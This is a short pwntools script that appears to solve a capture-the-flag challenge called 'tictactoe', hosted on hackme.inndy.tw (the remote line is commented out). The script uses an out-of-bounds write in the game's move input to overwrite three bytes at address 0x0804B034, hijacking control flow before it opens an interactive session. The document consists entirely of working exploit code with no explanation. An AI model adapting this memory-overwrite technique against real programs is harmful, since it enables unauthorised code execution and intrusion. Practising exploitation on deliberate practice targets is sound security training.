from pwn import *

elf=ELF('./tictactoe')
sh=process('./tictactoe')
#sh=remote("hackme.inndy.tw", 7714)

context.log_level = "debug"


def overwrite(ch,addr):
    sh.sendlineafter('flavor): ','9')
    sh.sendline(ch)
    sh.sendlineafter('flavor): ',str(addr))

mem_addr=0x0804B034
offset=0x804B056
#little endian
sub_addr=['\x46','\x8c','\x04']

sh.sendlineafter("(2)nd? ",'1')
for i in range(3):
    ch=sub_addr[i]
    addr=mem_addr+i-offset
    overwrite(ch,addr)
    
sh.interactive()
sh.close()